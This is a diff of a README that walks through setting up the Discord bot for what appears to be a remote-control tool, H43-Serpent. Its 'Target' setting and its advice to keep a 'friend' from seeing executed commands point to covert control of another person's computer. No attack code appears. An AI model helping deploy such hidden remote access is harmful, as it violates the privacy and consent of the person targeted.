@@ -41,7 +41,7 @@ Target defined in `config.ini`
 1. Create a [Discord](https://https://discord.com/) account or use your own account (It won't give any problems to your account so you can relax)
 2. Go to [Disocrd Developer Applications](https://discord.com/developers/applications) and create an application
     - 2.1 Save the APPLICATION ID number for latter
-    - 2.2 Go to Bot (left side button) click on Reset Token and copy the new Token for later (Something like Nzk4OA.G8dpS0.Zqy-7ydO_bL....)
+    - 2.2 Go to Bot (left side button) click on Reset Token and copy the new Token for later (Something like `Nzk4OA.G8dpS0.Zqy-7ydO_bL....`)
     - 2.3 Scroll down until Privileged Gateway Intents. Enable all three intents (PRESENCE, SERVER MEMBERS, MESSAGE CONTENT)
 3. Put this link on your browser and add the Application ID from 2.1 and put where it says ID: [https://discord.com/oauth2/authorize?scope=bot&permissions=8&client_id=](https://discord.com/oauth2/authorize?scope=bot&permissions=8&client_id=)`ID` and choose your server (I recommend creating a server where your friend isn't there to see the commands being executed)
 4. Download this [repository](https://github.com/Fytex/H43-Serpent/archive/refs/heads/main.zip) to your computer
